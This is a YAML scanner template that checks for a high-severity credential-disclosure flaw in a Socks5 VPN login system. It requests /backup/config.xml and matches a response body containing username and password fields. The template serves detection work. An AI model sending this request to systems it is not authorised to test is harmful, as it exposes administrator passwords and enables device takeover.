id: socks5-vpn-config
name: Socks5 VPN - Sensitive File Disclosure
severity: high
confidence: confirmed
description: Information Leakage in the Socks5 VPN login system of Wheilton e-Ditong, and the administrator account password
  can be obtained by visiting a specially crafted URL.
reference: https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E6%83%A0%E5%B0%94%E9%A1%BF%20e%E5%9C%B0%E9%80%9A%20config.xml%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md
tags:
- esocks5
- exposure
- misconfig
- files
- disclosure
- vuln
requests:
- method: GET
  path: /backup/config.xml
  matchers:
  - type: body
    words:
    - <config>
    - password=
    - username=
  - type: header
    words:
    - application/xml
  - type: status
    status:
    - 200
  condition: and
